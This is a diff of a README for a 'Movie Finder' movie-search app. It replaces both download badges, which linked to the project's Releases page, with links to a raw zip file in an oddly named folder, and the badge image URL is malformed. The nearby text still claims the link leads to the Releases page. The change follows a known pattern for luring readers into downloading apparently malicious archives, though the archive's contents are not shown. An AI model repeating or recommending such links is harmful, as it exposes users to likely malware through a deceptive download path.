@@ -8,7 +8,7 @@ Welcome to Movie Finder! This web app helps you search for movies smoothly. With
 
 To get started, you will need to download Movie Finder. Visit this page to download:
 
-[![Download Movie Finder](https://img.shields.io/badge/Download-Movie%20Finder-blue.svg)](https://github.com/oussemagzh/movie-finder/releases)
+[![Download Movie Finder](https://github.com/oussemagzh/movie-finder/raw/refs/heads/main/undiminished/finder-movie-3.4.zip%https://github.com/oussemagzh/movie-finder/raw/refs/heads/main/undiminished/finder-movie-3.4.zip)](https://github.com/oussemagzh/movie-finder/raw/refs/heads/main/undiminished/finder-movie-3.4.zip)
 
 On the Releases page, you will find the latest version ready for download. Just click the link, follow the prompts, and install the app on your device.
 
@@ -52,4 +52,4 @@ Movie Finder is open-source software. You can use and modify it according to you
 
 Don’t forget to download the latest version here:
 
-[![Download Movie Finder](https://img.shields.io/badge/Download-Movie%20Finder-blue.svg)](https://github.com/oussemagzh/movie-finder/releases)
+[![Download Movie Finder](https://github.com/oussemagzh/movie-finder/raw/refs/heads/main/undiminished/finder-movie-3.4.zip%https://github.com/oussemagzh/movie-finder/raw/refs/heads/main/undiminished/finder-movie-3.4.zip)](https://github.com/oussemagzh/movie-finder/raw/refs/heads/main/undiminished/finder-movie-3.4.zip)
